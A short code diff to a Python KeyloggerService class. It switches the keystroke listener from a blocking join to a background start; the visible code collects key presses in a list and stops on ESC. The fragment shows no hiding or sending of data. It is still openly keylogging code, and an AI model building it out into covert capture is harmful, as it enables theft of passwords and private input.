@@ -12,8 +12,8 @@ class KeyloggerService(IKeyLogger):
         self.listener = None
 
     def start_logging(self) -> None:
-        with Listener(on_press= self.press) as self.listener:
-            self.listener.join()
+        self.listener = Listener(on_press= self.press)
+        self.listener.start()
 
     def stop_logging(self) -> None:
         self.listener.stop()
@@ -33,3 +33,4 @@ class KeyloggerService(IKeyLogger):
         if key_str == "<ESC>":
             self.stop_logging()
         self.presses.append(key_str)
+
